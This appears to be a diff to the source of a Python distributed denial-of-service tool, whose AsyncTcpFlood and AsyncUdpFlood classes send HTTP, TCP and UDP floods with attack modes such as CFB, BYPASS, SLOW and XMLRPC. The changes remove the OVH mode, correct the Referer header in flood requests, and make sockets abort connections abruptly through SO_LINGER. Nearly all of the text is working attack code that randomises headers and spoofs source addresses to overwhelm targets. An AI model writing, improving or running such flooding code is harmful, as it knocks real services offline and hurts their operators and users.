@@ -7,9 +7,10 @@ import time
 from copy import copy
 from functools import partial
 from os import urandom as randbytes
-from socket import (SOL_SOCKET, SO_RCVBUF, inet_ntoa)
+from socket import (SO_LINGER, SOL_SOCKET, SO_RCVBUF, inet_ntoa)
 from ssl import CERT_NONE, SSLContext, create_default_context
 from string import ascii_letters
+import struct
 from threading import Event
 from typing import Callable, Optional, Set, Tuple
 from urllib import parse
@@ -67,7 +68,7 @@ trex_ctx.set_verify(SSL.VERIFY_NONE, None)
 class Methods:
     HTTP_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
-        "NULL", "COOKIE", "PPS", "EVEN", "AVB", "OVH",
+        "NULL", "COOKIE", "PPS", "EVEN", "AVB",
         "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP",
         # this is not HTTP method (rather TCP) but this way it works with --http-methods
         # settings being applied to the entire set of targets
@@ -175,6 +176,7 @@ class AttackSettings:
 
 
 class AsyncTcpFlood:
+
     BASE_HEADERS = (
         'Accept-Encoding: gzip, deflate, br\r\n'
         'Accept-Language: en-US,en;q=0.9\r\n'
@@ -200,7 +202,6 @@ class AsyncTcpFlood:
         loop,
         settings: Optional[AttackSettings] = None
     ) -> None:
-        self.SENT_FLOOD = None
         self._event = event
         self._target = target
         self._addr = addr
@@ -213,10 +214,20 @@ class AsyncTcpFlood:
             else "GET"
         )
 
+        self._method = method
         self.SENT_FLOOD = getattr(self, method)
 
         self._loop = loop
+        self._transport = None
         self._settings = settings or AttackSettings()
+
+    @property
+    def stats(self) -> TargetStats:
+        return self._stats
+
+    @property
+    def desc(self) -> Tuple[str, int, str]:
+        return (self._target.host, self._target.port, self._method)
 
     @property
     def is_tls(self):
@@ -236,7 +247,7 @@ class AsyncTcpFlood:
     def random_headers(self) -> str:
         return (
             f"User-Agent: {random.choice(USERAGENTS)}\r\n"
-            f"Referrer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
+            f"Referer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
             self.spoof_ip()
         )
 
@@ -270,6 +281,11 @@ class AsyncTcpFlood:
             request += body
         return request.encode()
 
+    def _abort_transport(self):
+        if self._transport:
+            self._transport.abort()
+            self._transport = None
+
     async def run(self, on_connect=None) -> bool:
         try:
             return await self.SENT_FLOOD(on_connect=on_connect)
@@ -281,24 +297,20 @@ class AsyncTcpFlood:
             else:
                 raise exc
 
-    # XXX: get rid of RPC param when OVH is gone
     async def _generic_flood_proto(
         self,
         payload_type: FloodSpecType,
         payload,
         on_connect: Optional[asyncio.Future],
-        *,
-        rpc: Optional[int] = None
     ) -> bool:
         on_close = self._loop.create_future()
-        rpc = rpc or self._settings.requests_per_connection
         flood_proto = partial(
             FloodIO,
             self._loop,
             on_close,
             self._stats,
             self._settings,
-            FloodSpec.from_any(payload_type, payload, rpc),
+            FloodSpec.from_any(payload_type, payload, self._settings.requests_per_connection),
             on_connect=on_connect,
         )
         server_hostname = "" if self.is_tls else None
@@ -425,7 +437,7 @@ class AsyncTcpFlood:
             headers=(
                 f"Host: {self._target.authority}\r\n"
                 "User-Agent: null\r\n"
-                "Referrer: null\r\n"
+                "Referer: null\r\n"
                 + self.BASE_HEADERS
                 + self.spoof_ip()
             )
@@ -474,18 +486,6 @@ class AsyncTcpFlood:
                 yield FloodOp.READ, 1
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
-
-    async def OVH(self, on_connect=None) -> int:
-        payload: bytes = self.build_request()
-        # XXX: we might want to remove this attack as we don't really
-        #      track cases when high number of packets on the same connection
-        #      leads to IP being blocked
-        return await self._generic_flood_proto(
-            FloodSpecType.BYTES,
-            payload,
-            on_connect,
-            rpc=min(self._settings.requests_per_connection, 5),
-        )
 
     async def AVB(self, on_connect=None) -> bool:
         packet: bytes = self.build_request()
@@ -638,13 +638,15 @@ class AsyncTcpFlood:
         return await self._exec_proto(conn, on_connect, on_close)
 
     async def _exec_proto(self, conn, on_connect, on_close) -> bool:
-        transport = None
+        self._transport = None
         try:
             async with async_timeout.timeout(self._settings.connect_timeout_seconds):
-                transport, _ = await conn
-            sock = transport.get_extra_info("socket")
+                self._transport, _ = await conn
+            sock = self._transport.get_extra_info("socket")
             if sock and hasattr(sock, "setsockopt"):
                 sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
+                # the normal termination sequence SHOULD NOT to be initiated
+                sock.setsockopt(SOL_SOCKET, SO_LINGER, struct.pack("ii", 1, 0))
         except asyncio.CancelledError as e:
             if on_connect:
                 on_connect.cancel()
@@ -657,11 +659,11 @@ class AsyncTcpFlood:
         else:
             return bool(await on_close)
         finally:
-            if transport:
-                transport.close()
+            self._abort_transport()
 
 
 class AsyncUdpFlood:
+
     def __init__(
         self,
         target: Tuple[str, int],
@@ -672,7 +674,6 @@ class AsyncUdpFlood:
         loop,
         settings: Optional[AttackSettings] = None,
     ):
-        self.SENT_FLOOD = None
         self._target = target
         self._event = event
         self._stats = stats
@@ -680,7 +681,17 @@ class AsyncUdpFlood:
         self._loop = loop
         self._settings = settings or AttackSettings()
 
+        self._method = method
         self.SENT_FLOOD = getattr(self, method)
+
+    @property
+    def stats(self) -> TargetStats:
+        return self._stats
+
+    @property
+    def desc(self) -> Tuple[str, int, str]:
+        addr, port = self._target
+        return (addr, port, self._method)
 
     async def run(self) -> bool:
         return await self.SENT_FLOOD()
